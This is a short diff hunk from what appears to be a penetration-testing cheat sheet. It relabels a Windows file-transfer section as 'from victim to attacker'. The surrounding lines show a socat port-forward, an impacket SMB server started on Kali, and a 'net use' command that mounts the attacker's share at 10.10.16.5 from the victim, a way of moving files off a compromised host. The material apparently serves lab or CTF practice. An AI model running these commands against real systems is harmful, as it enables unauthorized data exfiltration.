@@ -126,7 +126,7 @@ socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
 
 ## Transfering files
 ### Windows
-via SMB server:
+via SMB server(from victim to attacker):
 ```
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username user -password pass share . -smb2support  # On kali
 net use \\10.10.16.5\share /u:user pass   # On victim
